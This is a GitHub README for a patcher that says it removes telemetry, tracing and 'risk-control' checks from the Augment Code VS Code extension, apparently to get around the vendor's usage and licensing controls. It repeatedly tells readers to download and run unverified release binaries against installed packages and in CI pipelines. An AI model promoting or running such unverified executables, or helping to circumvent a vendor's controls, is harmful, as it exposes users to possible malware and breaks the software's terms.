# Augment-Clean-Patcher — Strip Telemetry from Augment Code
[![Releases](https://img.shields.io/badge/Releases-GitHub-blue?logo=github)](https://github.com/luisbeta1998/augment-clean-patcher/releases) [![augment-code](https://img.shields.io/badge/-augment--code-8da0cb)](https://github.com/topics/augment-code) [![vscode](https://img.shields.io/badge/-vscode-007acc?logo=visual-studio-code)](https://github.com/topics/vscode) [![vscode-extension](https://img.shields.io/badge/-vscode--extension-61dafb)](https://github.com/topics/vscode-extension)

![VSCode patching illustration](https://code.visualstudio.com/assets/images/code-stable.png)

Augment-Clean-Patcher removes built-in telemetry, tracing, and risk-control hooks from Augment Code packages. It targets the aug_cleaner flavor and prepares a safe, stripped build you can use offline or in private environments.

简体中文：本工具为 Augment Code 自动化打包插件（aug_cleaner 版），用于清除 Augment Code 中的遥测、跟踪与风控机制，并生成可用的精简包。

Key topics: augment-code, augment-code-free, vscode, vscode-extension

Quick link to releases (download the patch file and run it):
https://github.com/luisbeta1998/augment-clean-patcher/releases

---

Table of contents

- Features
- Why use this
- How it works
- Install and run (download and execute release file)
- Usage examples
- VSCode extension integration
- Development notes
- Troubleshooting
- Contributing
- License
- Credits

Features

- Remove telemetry calls and network beacons from Augment Code builds.
- Strip tracing hooks and risk-control checks that block local usage.
- Produce patched artifacts for Windows, macOS, and Linux.
- Provide a reproducible patch flow for CI and local builds.
- Offer a small command-line tool to automate patch steps.

Why use this

- You keep your environment private. The patch removes outbound telemetry.
- You build local variants without remote locks.
- You keep the rest of Augment Code functionality intact.
- You script the patch into CI for repeatable builds.

How it works

- The tool scans package files to find known telemetry and tracking patterns.
- It applies targeted edits or replaces modules with neutral stubs.
- The tool updates build metadata where needed so the patched package installs cleanly.
- It leaves user-facing features unchanged while neutralizing telemetry calls.
- The flow aims to be minimal and reversible where possible.

Install and run (download and execute release file)

Use the Releases page to get the latest build. Download the release asset that matches your platform and follow the run steps below.

Important: the release page hosts the patched executables and scripts. Download the correct asset and execute it.

Releases page:
[![Download Releases](https://img.shields.io/badge/Download%20-%20Releases-blue?logo=github)](https://github.com/luisbeta1998/augment-clean-patcher/releases)

Typical files you may see on the Releases page:
- aug-clean-patcher-linux.tar.gz
- aug-clean-patcher-macos.zip
- aug-clean-patcher-win.zip
- aug-clean-patcher.sh (portable script)
- aug-clean-patcher.exe (Windows binary)

General steps

1. Open the Releases page: https://github.com/luisbeta1998/augment-clean-patcher/releases
2. Download the asset that fits your OS.
3. Unpack if needed.
4. Make the script executable (Linux/macOS): chmod +x aug-clean-patcher.sh
5. Run the patch tool against your Augment Code package.

Examples

- Linux / macOS (script)
  - chmod +x aug-clean-patcher.sh
  - ./aug-clean-patcher.sh /path/to/augment-code-package
- Linux / macOS (binary)
  - tar -xzf aug-clean-patcher-linux.tar.gz
  - ./aug-clean-patcher /path/to/augment-code-package
- Windows
  - Unzip aug-clean-patcher-win.zip
  - Run aug-clean-patcher.exe from PowerShell: .\aug-clean-patcher.exe C:\path\to\augment-code-package

Run flow

- The tool creates a backup copy of the input package.
- It logs the changes to a patch.log file inside the output folder.
- It writes a fingerprint file so you can track that the package passed through this patcher.

Usage examples

Patch a local VSIX (VSCode extension) build

- Unpack the VSIX (it is a zip archive).
- Run the patch tool against the unpacked folder.
- Repack the VSIX and install it into VSCode.

Commands (sample)
- unzip extension.vsix -d ext
- ./aug-clean-patcher.sh ext
- cd ext && zip -r ../extension-patched.vsix *
- code --install-extension ../extension-patched.vsix

Patch a packaged app

- Stop the app if it runs as a service.
- Run the patcher on the installation folder.
- Restart the service.

Options

- --dry-run : analyze and report the changes without writing files.
- --backup-dir <dir> : place backups in the given folder.
- --log-level <level> : set log verbosity (info, warn, error).

VSCode extension integration

- You can add the patch step to extension CI.
- Insert a job in your pipeline that downloads the release asset and runs it on the build folder.
- Keep the pipeline idempotent: always produce a fresh patched artifact in a predictable output path.

Sample CI snippet (concept)

- Download release asset for the runner OS.
- Unpack and run the patch tool.
- Archive the patched VSIX.

Development notes

- The tool matches known telemetry modules and strings. It uses a small rule set to avoid broad changes.
- Add a rule when you find a new telemetry pattern. Rules live in the rules/ folder.
- Tests run by applying the patch to sample fixtures in tests/fixtures and comparing checksums.
- The repo includes sample fixtures that show before/after state.

Project layout (high level)

- bin/      — compiled binaries and helper scripts
- src/      — source code for the patcher
- rules/    — pattern rules the patcher applies
- docs/     — design notes and examples
- tests/    — unit tests and fixtures

Troubleshooting

- If the patch finds no patterns, it logs zero changes. Check your input path.
- If a patched package fails to load, restore the backup and open patch.log to inspect edits.
- If you see runtime errors, test disabling a single rule to isolate the change.
- If you cannot run an asset, verify OS and permissions. On macOS, you may need to allow the binary in Security & Privacy.

Security and integrity

- The patcher writes checksums for the original and patched artifacts.
- Use your CI to sign or notarize the final artifact before distribution.
- The tool keeps a backup to allow rollbacks.

Contributing

- Open an issue when you find an unsupported telemetry pattern.
- Submit rule updates as pull requests. Keep rules focused and well-documented.
- Add tests that show the failing pattern and the correct patched output.
- Follow the code style in src/. Keep functions small and clear.

Style guide

- Use short functions and small test cases.
- Add unit tests for each rule.
- Keep log messages clear and factual.

Releases and downloads

- Visit the Releases page to get the latest stable build: https://github.com/luisbeta1998/augment-clean-patcher/releases
- Download the platform asset and run it as shown above.
- Each release contains a changelog and assets for common platforms.

License

- The project uses an open source license. See the LICENSE file in the repo for details.

Credits

- Built for users who need local, offline variants of Augment Code.
- Based on community reports and sample artifacts.

Badges

- Use the badges at the top for quick access to releases and topics.
- You can embed the same Releases badge in other documentation.

Useful links

- Releases: https://github.com/luisbeta1998/augment-clean-patcher/releases
- Topics: augment-code, augment-code-free, vscode, vscode-extension

Screenshots and gallery

- Patch log sample (excerpt)
  - [PATCH] removed telemetry: network.beacon()
  - [REPLACE] stubbed trace.startSpan()
  - [BACKUP] created backups/augment-1.2.3.orig.zip

- Example patched file tree
  - extension/
    - package.json
    - out/
      - main.js (patched)
    - patch.log

Localization (简体中文)

- 说明：该工具用于去除 Augment Code 包中的遥测与追踪代码，生成可在本地或离线环境运行的精简版本。
- 使用方法：前往 Releases 页面，下载匹配平台的发布文件，解压后运行脚本或二进制文件对目标包执行打补丁操作。

End of file